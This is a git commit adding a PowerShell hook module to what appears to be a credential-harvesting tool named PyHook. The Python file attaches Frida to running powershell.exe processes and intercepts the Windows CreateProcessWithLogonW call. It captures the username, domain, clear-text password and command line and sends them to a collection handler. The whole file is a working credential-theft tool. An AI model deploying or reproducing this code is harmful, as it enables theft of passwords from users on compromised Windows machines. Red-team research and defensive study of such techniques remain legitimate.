012b587ea7c1a1de04548fd2a33bba093291e3df
Ilan Kalendarov <43996999+IlanKalendarov@users.noreply.github.com>
2021-09-07 09:46:31 +0300

    Added support for powershell hooking

---
+++ hooks/powershell.py
@@ -0,0 +1,48 @@
+from PyHook import wait_for_process, on_credential_submit, log
+import frida
+
+
+hook_process_name = "powershell"
+
+
+def logger(message):
+    log(hook_process_name, message)
+
+
+def wait_for():
+    wait_for_process(["powershell.exe"], hook)
+
+
+def hook(pid):
+    try:
+        logger("Trying To Hook Into PowerShell")
+        session = frida.attach(pid)
+        logger(f"Hooked PowerShell With PID {pid}")
+        script = session.create_script("""
+
+		var CreateProcessWithLogonW = Module.findExportByName("Advapi32.dll", 'CreateProcessWithLogonW')
+
+		Interceptor.attach(CreateProcessWithLogonW, {
+			onEnter: function (args) {
+
+
+				this.lpUsername = args[0];
+				this.lpDomain = args[1];
+				this.lpPassword = args[2];
+				this.lpCommandLine = args[5];
+			},
+			onLeave: function (args) {
+				send("\\n=============================" + "\\n[+] Intercepted Creds from PowerShell" +"\\nUsername    : " + this.lpUsername.readUtf16String() + "\\nCommandline : " + this.lpCommandLine.readUtf16String() + "\\nDomain      : " + this.lpDomain.readUtf16String() + "\\nPassword    : " + this.lpPassword.readUtf16String()+ "\\n=============================");
+
+
+			}
+		});
+
+		""")
+        script.on('message', on_credential_submit)
+        script.load()
+
+    except Exception as e:
+        logger("Unhandled exception: " + str(e))
+        logger("Continuing...")
+
